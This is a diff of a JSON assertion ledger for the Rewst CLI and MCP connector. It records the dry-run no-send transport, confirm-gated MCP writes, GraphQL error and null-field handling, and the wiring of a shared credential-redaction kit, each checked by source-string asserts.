+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach Domotz whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names. Ported to pandadoc from the knowbe4 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the pandadoc names. Ported to rewst from the pandadoc 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (pandadoc, knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the rewst names.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rewst_guard.go",
+     "contains": "next = credkit.Transport(dryRunTripper{})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/domotz_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Domotz: no write without confirm, the string \"true\" previews, and boolean true sends (control). Ported to domotz from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the abnormal 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the atera 4.34.2 reprint (one credential layer across the fleet). Ported to domotz from the betterstack 4.34.2 reprint (one credential layer across the fleet). Ported to knowbe4 from the domotz 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (domotz names, commands and seen/ logs of that run dir); the asserts carry the knowbe4 names. Ported to pandadoc from the knowbe4 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the pandadoc names. Ported to rewst from the pandadoc 4.34.2 reprint ledger (one credential layer across the fleet): this text is the donor's verbatim (pandadoc, knowbe4 or domotz names, commands and seen/ logs of those run dirs); the asserts carry the rewst names.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/rewst_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/rewst_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-graphql-probe",
+   "status": "active",
+   "summary": "doctor probes Rewst's one endpoint with ONE GraphQL read (POST /graphql userOrganization) and classifies the HTTP status AND the errors array; doctorShippedBaseURL is empty because https://api.rewst.io is Rewst's real US host",
+   "why": "The fleet doctor replay restored the shipped doctor_verdict.go with doctorShippedBaseURL = \"https://api.rewst.io\" (press-traps s5), so every healthy default install read \"base_url is a placeholder\" and the credential was never probed; with REWST_BASE_URL set, the GET walk found the press's placeholder GET /graphql, which the gateway answers 404, so a working token read \"base_url is not this vendor's API root\". Rewst answers an authorization failure with HTTP 200 and an errors array, so the errors array decides the verdict; the server's message text is never printed (only plain-identifier codes the funnel does not withhold). tools/apply_doctor_graphql.py must run AFTER every replay_handfixes.py (it restores doctor_verdict.go from the shipped tree). Test seen failing first: seen/doctor-graphql-probe-seen-failing.log in the run dir. (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorGraphQLProbe = `query DoctorProbe { userOrganization { id } }`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "body, status, err := c.Post(ctx, probePath, map[string]any{\"query\": doctorGraphQLProbe})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "r.failed = len(resp.Errors) > 0",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "not_contains": "c.ProbeGet(ctx, apiPath)"
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_doctor_graphql_test.go",
+     "contains": "func TestDoctorProbesTheGraphQLEndpoint(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_doctor_graphql_test.go",
+     "contains": "func TestDoctorTreatsTheShippedHostAsReal(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-constructors",
+   "status": "active",
+   "summary": "the six novels live in the hand file internal/cli/rewst_novel.go; root.go registers new<X>Cmd with a literal AddCommand and the press's per-novel scaffolds are absent",
+   "why": "A reprint with the research dir emits health.go, roi.go, failures.go, dormant.go, drift.go and coverage.go scaffolds (TODO bodies) plus addNovelCommandIfAbsent(newNovel<X>Cmd) registrations that would shadow the real commands; tools/graft_novels.py removes them and registers the real constructors (literal AddCommand: dogfood ignores addNovelCommandIfAbsent, press-traps s3). (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newHealthCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newRoiCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newFailuresCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newDormantCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newDriftCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newCoverageCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "newNovelHealthCmd"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "newNovelRoiCmd"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "newNovelFailuresCmd"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "newNovelDormantCmd"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "newNovelDriftCmd"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "newNovelCoverageCmd"
+    },
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "return classifyAPIError(cmd.OutOrStdout(), err, flags)",
+     "code_only": true,
+     "min_count": 6
+    }
+   ]
+  },
+  {
+   "id": "graphql-errors-are-failures",
+   "status": "active",
+   "summary": "a 2xx answer from the GraphQL endpoint whose top-level errors (or error) member is populated is an HTTP error for every caller (401 for an authentication code such as Rewst's AUTH_ERR, 403 permission, 400 rejected request, else 502) (typed commands, novels, sync, MCP mirrors), whatever data rides beside it; doctor reads that status as the GraphQL answer it was",
+   "why": "Rewst answers a failed operation with HTTP 200 and an errors array, and the generated client reads only the status: fake/probe_errors.sh showed `org-variables get` print {\"results\":{\"errors\":[...]}} and exit 0, so sync would store the envelope as data and an MCP mirror return it as a result (an MSP reading 'no data' where the API said 'failed'). Any failure signal wins: the check runs in the guard chain (registerClientHook, no generated file changed) after the response holder, so the body that becomes the error text is already held. Note: the typed commands are generated REST-shaped (no GraphQL document; a press limitation recorded in LEDGER-NOTES), so against the real gateway they now fail loudly instead of printing an error envelope. Test seen failing first: seen/graphql-errors-are-failures-seen-failing.log in the run dir. (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rewst_graphql_errors.go",
+     "contains": "func graphQLAnswerFailed(body []byte) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_graphql_errors.go",
+     "contains": "for _, name := range []string{\"errors\", \"error\"} {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_guard.go",
+     "contains": "c.HTTPClient.Transport = graphQLErrorsTripper{next: next}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "graphQLErrorsPopulated([]byte(apiErr.Body))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_graphql_errors.go",
+     "contains": "resp.StatusCode = graphQLFailureStatus(plain)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_graphql_errors_test.go",
+     "contains": "func TestGraphQLFailureStatusFollowsTheCode(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/graphql_errors_test.go",
+     "contains": "func TestGraphQLErrorsBehindAByteOrderMarkAreFailures(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_graphql_errors_test.go",
+     "contains": "func TestGraphQLErrorsAnswerIsAFailure(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_graphql_errors_test.go",
+     "contains": "func TestGraphQLAnswerFailedReadsEveryShape(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-typed-commands-limitation",
+   "status": "active",
+   "summary": "README and SKILL say the typed entity commands are generated REST-shaped and refused by the Rewst GraphQL gateway (a refused or errored answer is a failure, never empty data), and point at the six GraphQL-native novels; the escape hatch is the real `api` command and the headline is short and plain",
+   "why": "research.json narrative is the source dogfood and shipcheck re-render from (tools/research_fix.py): the published docs promised a typed GraphQL mirror and 'a raw GraphQL escape hatch' (no raw command exists), and the 150-character headline was cut mid-word on four surfaces. (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "README.md",
+     "contains": "are generated as REST-shaped calls the Rewst GraphQL gateway refuses"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "raw GraphQL escape hatch"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "raw GraphQL escape hatch"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "agent-native command"
+    }
+   ]
+  },
+  {
+   "id": "bb-rewst-suite",
+   "status": "active",
+   "summary": "the credential black-box suite (internal/rewstblackbox) runs the built CLI and MCP binaries against an offline Rewst GraphQL fake that answers both the GraphQL POSTs and the typed commands' REST-shaped calls and echoes every documented credential in every position and encoding",
+   "why": "Adapted from the pandadoc suite by the black-box helper (34 tests; 1061 CLI runs, 577 MCP tools/call requests): written files, every output channel, redirect and homoglyph-host refusal, MCP confirm, --dry-run, splits, writers, outbound, config sources, mask-shaped/numeric/whitespace credentials, Zstandard streams, MCP HTTP mode, sync paging. (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "cli/internal/rewstblackbox/blackbox_test.go",
+     "contains": "func TestNoCredentialInAnyOutput(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/response_credentials_test.go",
+     "contains": "func TestEveryDocumentedResponseCredentialIsHeld(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/mcp_http_test.go",
+     "contains": "func TestMCPHTTPModeNeedsTokenAndLoopback(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/sync_pager_test.go",
+     "contains": "func TestSyncWalksEveryPage(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-missing-input-is-an-error",
+   "status": "active",
+   "summary": "every novel GraphQL read goes through decodeGraphQLPayload (an empty, null or undecodable answer, or an absent/null field, is an error); drift fails when either side fails and reads orgVariables and packsForOrg page by page (a list still full at the bound is an error)",
+   "why": "The carried novels ignored decode errors and read a null field as zero: workflowExecutionStats (nullable in the SDL) null printed verdict \"healthy\", workflowExecutions (nullable list) null printed no failures, and so on; drift replaced a failed side with an empty set, reporting every pack of the other side as missing there; packsForOrg(limit: Int = 100) truncated both lists, so two identical 150-pack orgs showed 50 packs of drift each way. Test seen failing first: seen/novel-missing-input-seen-failing.log in the run dir. (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "func decodeGraphQLPayload(data json.RawMessage, out any, fields ...string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "if err := decodeGraphQLPayload(",
+     "code_only": true,
+     "min_count": 6
+    },
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "not_contains": "_ = json.Unmarshal("
+    },
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "if len(fetchErrs) > 0 {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "func fetchPagedNames(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_novel_inputs_test.go",
+     "contains": "func TestNovelsRefuseMissingNullOrUndecodableData(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_novel_inputs_test.go",
+     "contains": "func TestDriftFailsWhenEitherSideFails(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_novel_inputs_test.go",
+     "contains": "func TestDriftReadsEveryPage(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-scan-caps-said",
+   "status": "active",
+   "summary": "coverage reports scan_capped (and a note) and dormant workflows_capped when a list came back exactly --limit long, so a capped scan cannot read as the whole MSP",
+   "why": "coverage printed \"<pack> 50/50 orgs\" when managedAndSubOrganizations(limit) stopped at the cap, and dormant examined only the first --limit workflows without saying so. Test seen failing first: seen/novel-scan-caps-said-seen-failing.log in the run dir. (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "ScanCapped bool   `json:\"scan_capped\"`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "view.WorkflowsCapped = true",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_novel_inputs_test.go",
+     "contains": "func TestScanCapsAreSaid(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-orgs-directory",
+   "status": "active",
+   "summary": "new novel `orgs` (Org directory): the token's organization and every managed sub-org with the ids --org and --parent take, from one GraphQL read (userOrganization { managedAndSubOrgs }); a missing organization, a missing list or an undecodable answer is an error, never an empty directory",
+   "why": "Added in the 4.34.2 reprint (POLICIES: keep every novel, add new ones). The six rollups need org ids and the typed organizations mirror is REST-shaped (refused by the gateway), so an operator had no CLI way to find an id. Registered literally in root.go by tools/graft_novels.py; research.json carries it in novel_features (tools/research_fix.py). (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "rootCmd.AddCommand(newOrgsCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_orgs.go",
+     "contains": "func orgsFromAnswer(data json.RawMessage, includeDeleted bool) (orgsView, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_orgs_test.go",
+     "contains": "func TestOrgsFromAnswerRefusesMissingInput(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_orgs_test.go",
+     "contains": "func TestOrgsCommandEndToEnd(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "graphql-render-surface",
+   "status": "active",
+   "summary": "the 4.34.2 GraphQL render's surface defects are repaired after every render (tools/fix_graphql_surface.py): `tail` removed (this render emits no read resource paths, so it could never resolve one), the dead retainCLIQueryParams/retainExplicitQueryParams removed, and every typed endpoint command without an Example gets one built from its own required flags",
+   "why": "Press verify failed `tail` statically (\"resolver has no emitted resource paths\"; published 0.1.5's tail requested GET /<resource>, which Rewst never serves) and dogfood failed on two dead helpers and 30% example coverage (4.34.x emits only runnable Examples and the SDL carries no example values: 98 of 153 commands had none). A reprint re-emits all three. (rewst 4.34.2 reprint, 2026-10-30)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "rootCmd.AddCommand(newTailCmd(flags))"
     },
     {
      "file": "cli/internal/cli/helpers.go",
-     "contains": "funnelShownError(err),",
-     "min_count": 1,
+     "not_contains": "func retainCLIQueryParams("
+    },
+    {
+     "file": "cli/internal/cli/org-variables_get.go",
+     "contains": "Example:     \"  rewst-cli org-variables get --visible-for-org-id 11111111-1111-1111-1111-111111111111\", // rewst handfix typed-command-examples",
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/promoted_role-user-counts.go",
+     "contains": "// rewst handfix typed-command-examples",
+     "code_only": false
+    }
+   ]
+  },
+  {
+   "id": "r1-novel-null-list-element",
+   "status": "active",
+   "summary": "a null anywhere a novel reads a value (a list element, a field inside a row) is missing input, never a zero: every novel decode goes through decodeRow, whose rejectNullMembers walks the answer alongside the Go type it decodes into",
+   "why": "Codex review r1, a new instance of the pre-closed class novel-missing-input-is-an-error: the SDL field workflowExecutions is [WorkflowExecution] (nullable elements), so `failures` on {\"data\":{\"workflowExecutions\":[null]}} decoded the null into a zero execution, reported scanned_executions:1 and failures:[], and an MSP read a run the API could not return as one it examined and found healthy. noNullElement (rewst_novel.go) fails every novel that passes its list field to decodeGraphQLPayload (failures, dormant, roi, coverage, and drift via fetchPagedNames); orgsNoNullManagedOrg closes the orgs path. Test seen failing first: seen/r1-novel-null-list-element-seen-failing.log in the run dir. (rewst 4.34.2 reprint, 2026-10-30) Widened as a class in the 2026-11-05 publish (Codex round 2 of the reprint found null FIELDS inside rows, e.g. TimeSavedGroupByWorkflow.secondsSaved and Organization.id, read as zero): noNullElement and orgsNoNullManagedOrg were replaced by one shared walk. Test seen failing first: .review/seen/novel-null-field-in-row-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "func rejectNullMembers(raw json.RawMessage, t reflect.Type, path string) error {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/helpers.go",
-     "not_contains": "\"error\": err.Error(),"
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "func decodeRow(raw json.RawMessage, out any) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_novel.go",
+     "contains": "if err := rejectNullMembers(raw, reflect.TypeOf(out), \"\"); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rewst_orgs.go",
+     "contains": "if err := decodeRow(data, &payload); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_novel_inputs_test.go",
+     "contains": "func TestNovelsRefuseNullListElements(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/zz_rewst_novel_null_fields_test.go",
+     "contains": "func TestNovelsRefuseNullFieldsInsideRows(t *testing.T) {",
+     "code_only": true
     }
    ]
   },
@@ -604,6 +891,706 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own holder, output chokepoint, origin pin, secret funnel, store redaction and journal refusals. internal/credwire/declarations.go holds the one Declarations literal: REWST_API_TOKEN and REWST_MCP_HTTP_TOKEN, config.toml and the credentials.toml store (Files, --config and --home through credkit.FlagValues, run profiles held with credkit.HoldURL), --stdin bodies (StdinFlags, a JSON body compacted to one line first; feedback --stdin prose is stashed before the kit's read), the SDL's response credentials (auth0ClientSecret, auth0ClientId, the three login-token queries) plus a pack config's integration credentials, and the request fields that carry a credential (CredentialFields; client.dryRun holds a --dry-run preview's query and body the same way with credkit.HoldBody, since the press prints the preview before any transport), and the one origin every held value may go to (base_url). Each main starts with credkit.Start and ends with credkit.Exit; every API, webhook and feedback request goes through credkit.Transport (client.OutboundGuard); the stdin token and the built auth header are held with credkit.Hold; config and store reads are held with credkit.HoldBody; every journal, teach, feedback, jobs, profile, cache and download write goes through the kit; the MCP server runs credkit.MCPTools, MCPIn and MCPOut; the CLI child of an MCP tool runs through credkit.RunCommand; isTerminal asks credkit.Terminal. The response cache stays off (no-response-cache).",
+   "why": "One contract, one matcher and one set of sinks replace the 64 connector-only files ported from pandadoc, and a matcher fix reaches this connector by vendoring. The kit closes the factory's round-2 class secret-in-composed-encoding (an Ascii85 run whose bytes are a zlib stream of the token printed through the connector's matcher): TestSecretInComposedEncodingNeverPrints, seen failing before the wiring at .review/seen/secret-in-composed-encoding-seen-failing.log.",
+   "spec_encode_followup": "Press-side: generate the kit wiring (Declarations from the auth spec, Start and Exit in each main, kit sinks in the file, HTTP, SQL and MCP templates).",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "SecretEnv:     []string{\"REWST_API_TOKEN\", \"REWST_MCP_HTTP_TOKEN\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "StdinFlags:    []string{\"--stdin\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.StashFeedbackStdin()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.CompactStdinBody(args)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_stdin.go",
+     "contains": "func CompactStdinBody(args []string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_stdin.go",
+     "contains": "func StashFeedbackStdin() {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_stdin.go",
+     "contains": "func FeedbackStdin(args []string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "not_contains": "cli.RootCmd()"
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "data := cliutil.StashedStdin",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"auth0ClientSecret\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"getSkilljarLoginToken\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"*\", Allowed: []string{\"base_url\"}},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "CredentialFields: []string{\"api_token\", \"auth_header\", \"access_token\", \"refresh_token\", \"client_id\", \"client_secret\", \"password\", \"api_key\", \"encryption_key\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.HoldBody([]byte(preview.Encode()))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if errors.Is(err, credkit.ErrWithheld) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/rewstblackbox/sinks_test.go",
+     "contains": "func TestWithheldRequestIsNotRetried(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "credkit.FlagValues(args, \"--config\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations_test.go",
+     "contains": "func TestDeclaredResponseFieldsAreNoRewstProductName(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-cli/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/rewst-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-mcp/main.go",
+     "contains": "server.NewStdioServer(s).Listen(ctx, credkit.MCPIn(os.Stdin), credkit.MCPOut())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/rewst-mcp/main.go",
+     "not_contains": "server.ServeStdio("
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "httpClient.Transport = OutboundGuard(httpClient.Transport)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.Transport = OutboundGuard(c.Transport)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return &http.Client{Transport: credkit.Transport(tr)}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.Hold(\"minted:authorization\", authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "_ = credkit.WriteFile(s.path(key), []byte(value), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.Hold(\"stdin\", token)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "f, err := credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "client := &http.Client{Timeout: 15 * time.Second, Transport: credkit.Transport(nil)}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "if err := credkit.WriteFile(tmp, body, 0o600); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/jobs.go",
+     "contains": "credkit.OpenFile(",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "if err := credkit.WriteFile(tmp, data, 0o600); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
